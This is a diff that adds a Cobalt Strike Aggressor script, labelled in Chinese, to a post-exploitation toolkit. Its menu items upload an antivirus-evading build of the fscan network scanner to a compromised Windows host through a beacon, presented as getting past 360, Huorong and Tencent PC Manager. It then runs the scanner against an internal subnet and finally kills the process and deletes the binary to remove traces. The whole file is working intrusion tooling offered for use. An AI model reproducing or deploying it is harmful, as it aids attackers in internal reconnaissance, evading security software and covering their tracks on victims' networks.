@@ -1,0 +1,42 @@
+#内网扫描
+
+menu "内网扫描" {
+   menu "[+]fscan 免杀版" {
+    item "上传 Fscan免杀版" {
+      blog($1, "\c9=========== 上传 Fscan免杀版 2024.7 ==========");
+      $bid = $1;
+      $dialog = dialog("上传Fscan免杀版", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &fscanbypass);
+      dialog_description($dialog, "Fscan免杀版 过 360 火绒 电脑管家等。项目地址：https://github.com/susuya233/fscanpppro");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
+    }
+    sub fscanbypass {
+      bcd($bid, $3['UploadPath']);
+      bupload($bid, script_resource("/scripts/Scanning/fscanbypass.exe"));
+      }
+    item "运行 Fscan免杀版"{
+      blog($1, "\c9=========== 运行 Fscan免杀 ==========");
+      $bid = $1['@'];
+      btask($bid, "----------------------------------Fscan免杀 使用方法---------------------------------------", "");
+      btask($bid, "fscanbypass.exe -h", " 查看使用手册  中文 请使用GBK编码");
+
+      $dialog = dialog("运行fscan",%(exec => "fscanbypass.exe -h 192.168.1.1/24", bid => $bid),&fscanbypass_run);
+      dialog_description($dialog, "请在下方输入运行指令：");
+      drow_text($dialog, "exec", "Exec: ");
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+    }
+    sub fscanbypass_run{
+      $exec = $3['exec'];
+      brun($bid, "$exec");
+    }
+    item "删除 Fscan免杀版"{
+      blog($1, "\c9=========== 删除 RequestTemplate ==========");
+      $bid = $1['@'];
+      bshell($bid, "taskkill -f /im fscanbypass.exe & del /f /s /q fscanbypass.exe");
+    }
+    }
+
+
+}
